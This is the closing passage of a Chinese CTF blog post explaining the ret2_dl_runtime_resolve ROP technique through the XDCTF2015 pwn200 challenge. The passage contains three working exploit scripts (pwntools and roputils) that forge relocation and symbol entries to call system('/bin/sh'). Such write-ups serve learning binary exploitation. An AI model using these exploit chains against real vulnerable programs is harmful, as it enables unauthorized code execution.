class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">## write cmd=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;+&apos;\00&apos;</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line">faker_reloc_addr =  base_stage + 28 ## write:rel_addr 4*7 == 28  </span><br><span class="line">index_offset = faker_reloc_addr - rel_plt ## plt: push index_offset</span><br><span class="line">## r_offset -&gt; write: got</span><br><span class="line">r_offset = elf.got[&apos;write&apos;]</span><br><span class="line">## faker_sym</span><br><span class="line">faker_sym_addr = base_stage + 36 ##  28 + 2*4  == 36</span><br><span class="line">align = 0x10 - ((faker_sym_addr - dynsym) &amp; 0xf) # aligin 0x10</span><br><span class="line">faker_sym_addr += align </span><br><span class="line">index_sym = (faker_sym_addr - dynsym)/0x10 # struct &#123;0x10&#125;Elf32_Sym</span><br><span class="line">## write:Elf32_Rel &#123;r_offset, r_info &#125;</span><br><span class="line">r_info = (index_sym &lt;&lt; 8) | 0x7 # r_info&gt;&gt;8 = index_sym | R_386_JUMP_SLOT</span><br><span class="line">faker_reloc = p32(r_offset) + p32(r_info)</span><br><span class="line">faker_str_addr = faker_sym_addr + 0x10 ## behind of Elf32_Rel</span><br><span class="line">## write: LOAD:08048228  Elf32_Sym &lt;st_name, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">st_name = faker_str_addr - dynstr</span><br><span class="line">faker_sym = flat(st_name,0,0,0x12)</span><br><span class="line"></span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;aaaa&apos;)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(&apos;a&apos;*8)</span><br><span class="line">rop.raw(faker_reloc)</span><br><span class="line">rop.raw(&apos;a&apos;*align) ## padding to align </span><br><span class="line">rop.raw(faker_sym)</span><br><span class="line">rop.raw(&apos;system\x00&apos;)</span><br><span class="line">print len(rop.chain())</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里有个关于pwntools自动对齐的操作，如下图，发现已经计算好的base_stage+80是‘aa/bin/sh’。</p>
</blockquote>
<p><img src="/image/20200928/image9.png" alt="image"></p>
<blockquote>
<p>然后改为偏移82即可执行命令。</p>
</blockquote>
<p><img src="/image/20200928/image10.png" alt="image"></p>
<blockquote>
<p>经过调试发现，我们代码中是添加14个a（80-len(rop.chain())=14），结果有18个a，经过测试发现，这个a是这样分的：a✖️2 + a✖️14 + a✖️2，前两个a是system\x00补的，后两个是14个a补齐的，因此base_stage+80刚好是这个‘aa/bin/sh’的起始地址。</p>
</blockquote>
<p><img src="/image/20200928/image11.png" alt="image"></p>
<blockquote>
<p>建议直接拼接，这样就免除了麻烦。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += faker_reloc </span><br><span class="line">payload2 += &apos;a&apos; * align</span><br><span class="line">payload2 += faker_sym  </span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;a&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += sh</span><br><span class="line">payload2 += &apos;a&apos; * (100 - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最后直接贴上wiki里使用roputils的exp，发现我们理解原理了很久，payload的rop链构造了很久，直接一个roputils直接搞定，解题方法简单。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./main&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./main&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="0x04-尾记"><a href="#0x04-尾记" class="headerlink" title="0x04 尾记"></a>0x04 尾记</h1><blockquote>
<p>还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。<br>参考:<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2_dl_runtime_resolve" target="_blank" rel="noopener">ctfwiki</a><br><a href="https://bbs.pediy.com/thread-250703.htm" target="_blank" rel="noopener">ROP高级用法之ret2_dl_runtime_resolve</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/" target="_blank" rel="noopener">ELF file</a><br><a href="http://drops.xmd5.com/static/drops/binary-14360.html" target="_blank" rel="noopener">通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</a></p>
</blockquote>

      
    </div>
	<div>
      
          <div>
     
        <div style="text-align:center;color: #ccc;font-size:15px;">
              -------------本文结束&感谢您的阅读-------------
        </div>
</div>
      
	</div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:</strong>
    bey0ndm3
  </li>
    <li class="post-copyright-author">
    <strong>Post title:</strong>
    <a href="/2020/09/28/1/">高级rop之ret2_dl_runtime_resolve</a>
  </li>
  <li class="post-copyright-author">
    <strong>Publishing time:</strong>
    2020年09月28日 - 23:09
  </li>
  <li class="post-copyright-link">
    <strong>Post link:</strong>
    <a href="http://1234xxh.github.io/2020/09/28/1/" title="高级rop之ret2_dl_runtime_resolve">http://1234xxh.github.io/2020/09/28/1/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice: </strong>
    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
  </li>
  <li>转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
        </div>
      

      
      
        <div class="post-widgets">
        
          <div class="wp_rating">
            <div id="wpac-rating"></div>
          </div>
        

        

        
          
          <div id="needsharebutton-postbottom">
            <span class="btn">
              <i class="fa fa-share-alt" aria-hidden="true"></i>
            </span>
          </div>
        
        </div>
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/09/27/1/" rel="next" title="看懂栈迁移">
                <i class="fa fa-chevron-left"></i> 看懂栈迁移
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/11/14/1/" rel="prev" title="知识点回顾之Pyhon模版注入">
                知识点回顾之Pyhon模版注入 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/background.jpg"
                alt="bey0ndm3" />
            
              <p class="site-author-name" itemprop="name">bey0ndm3</p>
              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/virgilwjj/" title="virgilwjj" target="_blank">virgilwjj</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-GOT-PLT之延迟绑定"><span class="nav-number">1.</span> <span class="nav-text">0x01 GOT/PLT之延迟绑定</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-GOT-PLT之-dl-runtime-resolve"><span class="nav-number">2.</span> <span class="nav-text">0x02 GOT/PLT之_dl_runtime_resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Section-Header-Table"><span class="nav-number">2.1.</span> <span class="nav-text">Section Header Table</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rel-plt（重定向表）"><span class="nav-number">2.2.</span> <span class="nav-text">.rel.plt（重定向表）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dynsym（动态符号表）"><span class="nav-number">2.3.</span> <span class="nav-text">.dynsym（动态符号表）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dynstr（动态字符串表）"><span class="nav-number">2.4.</span> <span class="nav-text">.dynstr（动态字符串表）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找时的过程"><span class="nav-number">2.5.</span> <span class="nav-text">寻找时的过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-XDCTF2015·pwn200"><span class="nav-number">3.</span> <span class="nav-text">0x03 XDCTF2015·pwn200</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x04 尾记</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>

  
</div>

<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->

  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
      <div id="needsharebutton-float">
        <span class="btn">
          <i class="fa fa-share-alt" aria-hidden="true"></i>
        </span>
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  
  
  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">

  
  
  <script src="/lib/needsharebutton/needsharebutton.js"></script>

  <script>
    
      pbOptions = {};
      
          pbOptions.iconStyle = "box";
      
          pbOptions.boxForm = "horizontal";
      
          pbOptions.position = "bottomCenter";
      
          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
      
      new needShareButton('#needsharebutton-postbottom', pbOptions);
    
    
      flOptions = {};
      
          flOptions.iconStyle = "box";
      
          flOptions.boxForm = "horizontal";
      
          flOptions.position = "middleRight";
      
          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
      
      new needShareButton('#needsharebutton-float', flOptions);
    
  </script>

  
  <script type="text/javascript">
  wpac_init = window.wpac_init || [];
  wpac_init.push({widget: 'Rating', id: 12981,
    el: 'wpac-rating',
    color: 'fc6423'
  });
  (function() {
    if ('WIDGETPACK_LOADED' in window) return;
    WIDGETPACK_LOADED = true;
    var mc = document.createElement('script');
    mc.type = 'text/javascript';
    mc.async = true;
    mc.src = '//embed.widgetpack.com/widget.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
  })();
  </script>


  
  


  

  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>


</body>
</html>
